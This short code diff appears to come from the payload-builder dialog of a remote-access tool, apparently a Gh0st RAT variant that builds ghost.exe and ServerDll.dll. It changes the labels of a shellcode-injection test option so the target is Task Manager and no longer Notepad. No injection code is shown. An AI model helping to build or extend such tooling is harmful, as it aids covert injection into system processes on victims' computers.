@@ -204,7 +204,7 @@ void CBuildDlg::OnBnClickedOk()
     int index = m_ComboExe.GetCurSel(), typ=index;
     int is64bit = m_ComboBits.GetCurSel() == 0;
     if (index == IndexTestRun_InjSC && !is64bit) {
-        MessageBox("Shellcode 只能向64位记事本注入，注入器也只能是64位!", "提示", MB_ICONWARNING);
+        MessageBox("Shellcode 只能向64位电脑注入，注入器也只能是64位!", "提示", MB_ICONWARNING);
         return;
     }
     int startup = Startup_DLL;
@@ -434,7 +434,7 @@ BOOL CBuildDlg::OnInitDialog()
     pEdit->LimitText(99);
     m_ComboExe.InsertString(IndexTestRun_DLL, "TestRun - 磁盘DLL");
     m_ComboExe.InsertString(IndexTestRun_MemDLL, "TestRun - 内存DLL");
-    m_ComboExe.InsertString(IndexTestRun_InjSC, "TestRun - 注入记事本");
+    m_ComboExe.InsertString(IndexTestRun_InjSC, "TestRun - 注入任务管理器");
 
     m_ComboExe.InsertString(IndexGhost, "ghost.exe");
     m_ComboExe.InsertString(IndexServerDll, "ServerDll.dll");
